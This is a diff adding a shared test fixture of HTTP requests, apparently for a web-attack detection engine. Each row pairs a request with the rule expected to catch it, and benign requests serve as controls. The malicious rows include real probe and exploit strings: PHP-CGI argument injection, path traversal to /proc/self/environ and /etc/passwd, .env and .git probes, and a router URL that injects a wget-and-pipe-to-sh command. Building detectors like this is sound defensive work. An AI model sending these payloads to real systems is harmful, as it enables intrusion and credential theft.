@@ -1,0 +1,61 @@
+# expected-rule	method	uri	user-agent
+# Shared by the Go and PHP test suites so both engines must agree.
+# "-" means the request must not match any core signature.
+php-cgi-arg-injection	POST	/hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input	libredtail-http
+php-cgi-arg-injection	POST	/?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input	Mozilla/5.0
+php-cgi-arg-injection	POST	/index.php?%25ADd+allow_url_include%3D1+%25ADd+auto_prepend_file%3Dphp://input	Mozilla/5.0
+php-cgi-arg-injection	POST	/test.hello?%25ADd+allow_url_include%3D1+%25ADd+auto_prepend_file%3Dphp://input	Mozilla/5.0
+php-cgi-arg-injection	POST	/index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input	Mozilla/5.0
+php-cgi-arg-injection	POST	/php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1	Mozilla/5.0
+php-cgi-binary	GET	/php-cgi/php-cgi.exe	Mozilla/5.0
+php-stream-wrapper	GET	/index.php?page=php%3A%2F%2Ffilter%2Fresource%3Dindex	Mozilla/5.0
+proc-self-probe	GET	/%2e%2e/%2e%2e/%2e%2e/%2e%2e/proc/self/environ	-
+proc-self-probe	GET	/public/plugins/grafana-clock-panel/../../../../../../../../proc/self/environ	-
+proc-self-probe	GET	/@fs/proc/self/environ?import&raw??	CCBot/2.0 (https://commoncrawl.org/faq/)
+proc-self-probe	GET	/@fs/proc/self/cwd/.env?raw??	Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+proc-self-probe	GET	/__vite_rsc_findSourceMapURL?filename=file:///proc/self/environ&environmentName=rsc	Mozilla/5.0
+proc-self-probe	GET	/proc/self/cmdline	Mozilla/5.0 (compatible; Hunyuan/1.0; +https://hunyuan.tencent.com/)
+proc-self-probe	GET	/proc/self/cgroup	Mozilla/5.0
+proc-self-probe	GET	/....//....//....//..../proc/self/environ	Mozilla/5.0
+proc-self-probe	GET	/api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../proc/self/environ	Mozilla/5.0
+proc-self-probe	GET	/static/..;/..;/..;/..;/proc/self/environ	Mozilla/5.0
+proc-self-probe	GET	/api/fs/read?allowOutsideWorkspace=true&path=/proc/self/environ	Mozilla/5.0
+proc-self-probe	GET	/userfiles?path=../../../../proc/self/environ	DuckAssistBot/1.1
+proc-self-probe	GET	/icons/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/proc/self/environ	-
+system-file-probe	GET	/download?file=..%2F..%2F..%2Fetc%2Fpasswd	Mozilla/5.0
+shell-command-in-url	GET	/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget%20http%3A//0.0.0.0/router.tplink.sh%20-O-%7Csh)	-
+env-vcs-probe	GET	/.env	Mozilla/5.0
+env-vcs-probe	GET	/.git/config	Mozilla/5.0
+env-vcs-probe	GET	/app/.env.production	Mozilla/5.0
+env-vcs-probe	GET	/cgi-bin/%2eenv	curl/8.7.1
+cgi-bin-probe	POST	/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh	-
+cgi-bin-probe	POST	/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh	-
+cgi-bin-probe	GET	/cgi-bin/login.cgi	Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)
+cgi-bin-probe	GET	/cgi-bin/phpinfo.php	-
+cgi-bin-probe	GET	//cgi-bin/index.php	-
+cgi-bin-probe	POST	/cgi-bin/luci/;stok=/locale	r00ts3c-owned-you
+cgi-bin-probe	POST	/cgi-bin/webupg	Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+vite-dev-probe	GET	/@fs/etc/hosts?raw	Mozilla/5.0
+exploit-scanner-ua	POST	/	libredtail-http
+exploit-scanner-ua	GET	/login	Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)
+path-traversal	GET	/appearance/../../config/app.php	Mozilla/5.0
+wordpress-probe	GET	/wp-login.php	Mozilla/5.0
+wordpress-probe	GET	/blog/wp-admin/setup-config.php	Mozilla/5.0
+foreign-script-probe	GET	/struts/index.action	Mozilla/5.0
+phpinfo-probe	GET	/phpinfo.php	Mozilla/5.0
+-	GET	/	Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
+-	GET	/login	Go-http-client/1.1
+-	POST	/webhooks/stripe	Stripe/1.0 (+https://stripe.com/docs/webhooks)
+-	GET	/index.php	curl/8.7.1
+-	GET	/cart.php?a=add&pid=1	Mozilla/5.0
+-	GET	/clientarea.php?action=services	Mozilla/5.0
+-	GET	/.well-known/acme-challenge/test-token	-
+-	GET	/assets/app.css	Mozilla/5.0
+-	GET	/api/v1/invoices?filter%5Bstatus%5D=paid&sort=-created_at	Mozilla/5.0
+-	GET	/search?q=how+to+pipe+output+to+bash	Mozilla/5.0
+-	GET	/knowledgebase?q=wordpress+hosting+plans	Mozilla/5.0
+-	GET	/docs?path=guides/../intro	Mozilla/5.0
+-	GET	/environment/settings	Mozilla/5.0
+-	GET	/processes/self-service	Mozilla/5.0
+-	GET	/docs/proc/self-hosting	Mozilla/5.0
+-	GET	/redirect?to=https%3A%2F%2Fexample.com%2Fpath	Mozilla/5.0
